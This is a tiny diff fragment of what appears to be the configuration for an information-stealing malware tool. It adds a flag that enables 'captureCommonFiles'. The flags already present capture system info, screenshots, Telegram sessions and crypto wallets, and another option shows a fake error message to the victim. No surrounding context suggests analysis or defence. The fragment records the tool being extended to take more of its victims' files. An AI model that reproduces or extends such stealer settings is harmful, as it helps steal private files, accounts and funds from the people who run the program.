@@ -21,6 +21,7 @@
         "captureSystemInfo" : true,
         "captureScreenshot" : true,
         "captureTelegramSession" : true,
+        "captureCommonFiles" : true,
         "captureWallets" : true,
 
         "fakeError" : [false, ["title", "message", 0]],
